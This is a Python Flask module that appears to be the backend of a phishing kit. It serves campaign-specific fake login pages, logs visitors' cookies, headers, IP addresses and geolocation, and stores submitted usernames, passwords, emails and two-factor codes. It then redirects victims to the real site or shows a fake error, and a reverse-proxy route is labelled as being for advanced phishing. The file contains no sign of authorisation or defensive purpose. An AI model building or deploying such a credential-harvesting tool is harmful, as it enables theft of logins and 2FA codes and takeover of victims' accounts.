import json
from datetime import datetime
from flask import Blueprint, render_template, request, redirect, session, jsonify
from app import db
from models import Campaign, CapturedCredential, SessionLog, PhishingTemplate
from core.session_manager import SessionManager
from utils.helpers import get_client_ip, get_geolocation, parse_user_agent

phish_bp = Blueprint('phish', __name__)

@phish_bp.route('/')
@phish_bp.route('/<path:campaign_path>')
def serve_phishing_page(campaign_path=None):
    # Find active campaign
    if campaign_path:
        campaign = Campaign.query.filter_by(path=campaign_path, is_active=True).first()
    else:
        campaign = Campaign.query.filter_by(is_active=True).first()
    
    if not campaign:
        return "Campaign not found or inactive", 404
    
    # Log the visit
    session_manager = SessionManager()
    session_id = session_manager.create_session()
    
    # Get client information
    ip_address = get_client_ip(request)
    user_agent = request.headers.get('User-Agent', '')
    referer = request.headers.get('Referer', '')
    
    # Get geolocation
    geo_data = get_geolocation(ip_address)
    
    # Log session
    session_log = SessionLog(
        campaign_id=campaign.id,
        session_id=session_id,
        cookies=json.dumps(dict(request.cookies)),
        headers=json.dumps(dict(request.headers)),
        ip_address=ip_address,
        user_agent=user_agent,
        request_url=request.url,
        request_method=request.method
    )
    
    db.session.add(session_log)
    db.session.commit()
    
    # Get template
    template = campaign.template
    if not template:
        return "Template not found", 404
    
    # Render phishing page based on template
    template_name = f"phishing/{template.template_file}"
    
    try:
        return render_template(template_name, 
                             campaign=campaign,
                             target_url=campaign.target_url,
                             session_id=session_id)
    except:
        # Fallback to generic template
        return render_template('phishing/generic.html',
                             campaign=campaign,
                             target_url=campaign.target_url,
                             session_id=session_id)

@phish_bp.route('/submit', methods=['POST'])
@phish_bp.route('/submit/<path:campaign_path>', methods=['POST'])
def capture_credentials(campaign_path=None):
    # Find campaign
    if campaign_path:
        campaign = Campaign.query.filter_by(path=campaign_path, is_active=True).first()
    else:
        campaign_id = request.form.get('campaign_id')
        campaign = Campaign.query.get(campaign_id) if campaign_id else None
    
    if not campaign:
        return jsonify({'error': 'Campaign not found'}), 404
    
    # Extract credentials
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    email = request.form.get('email', '')
    two_fa_token = request.form.get('two_fa_token', '')
    
    # Get client information
    ip_address = get_client_ip(request)
    user_agent = request.headers.get('User-Agent', '')
    referer = request.headers.get('Referer', '')
    
    # Get geolocation
    geo_data = get_geolocation(ip_address)
    
    # Collect additional form data
    additional_data = {}
    for key, value in request.form.items():
        if key not in ['username', 'password', 'email', 'two_fa_token', 'campaign_id']:
            additional_data[key] = value
    
    # Save captured credentials
    captured_credential = CapturedCredential(
        campaign_id=campaign.id,
        username=username,
        password=password,
        email=email,
        ip_address=ip_address,
        user_agent=user_agent,
        referer=referer,
        country=geo_data.get('country', ''),
        city=geo_data.get('city', ''),
        coordinates=f"{geo_data.get('latitude', '')},{geo_data.get('longitude', '')}",
        two_fa_token=two_fa_token,
        additional_data=json.dumps(additional_data)
    )
    
    db.session.add(captured_credential)
    db.session.commit()
    
    # Log successful capture
    print(f"[PHISH] Credentials captured for campaign '{campaign.name}': {username}")
    
    # Redirect based on campaign settings
    if campaign.target_url:
        return redirect(campaign.target_url)
    else:
        # Show error page to make it look legitimate
        return render_template('phishing/error.html', message="Invalid credentials. Please try again.")

@phish_bp.route('/2fa', methods=['GET', 'POST'])
@phish_bp.route('/2fa/<path:campaign_path>', methods=['GET', 'POST'])
def handle_2fa(campaign_path=None):
    if request.method == 'GET':
        # Show 2FA page
        return render_template('phishing/2fa.html')
    
    # Handle 2FA submission
    campaign = None
    if campaign_path:
        campaign = Campaign.query.filter_by(path=campaign_path, is_active=True).first()
    
    two_fa_code = request.form.get('code', '')
    
    # Log 2FA attempt
    if campaign:
        # Update the latest credential with 2FA code
        latest_credential = CapturedCredential.query.filter_by(
            campaign_id=campaign.id
        ).order_by(CapturedCredential.captured_at.desc()).first()
        
        if latest_credential:
            latest_credential.two_fa_token = two_fa_code
            db.session.commit()
    
    print(f"[PHISH] 2FA code captured: {two_fa_code}")
    
    # Redirect to target or show success
    if campaign and campaign.target_url:
        return redirect(campaign.target_url)
    else:
        return redirect('https://www.google.com')

@phish_bp.route('/proxy/<path:url>')
def proxy_request(url):
    """Reverse proxy functionality for advanced phishing"""
    from core.proxy import ReverseProxy
    
    proxy = ReverseProxy()
    response = proxy.handle_request(request, url)
    
    return response
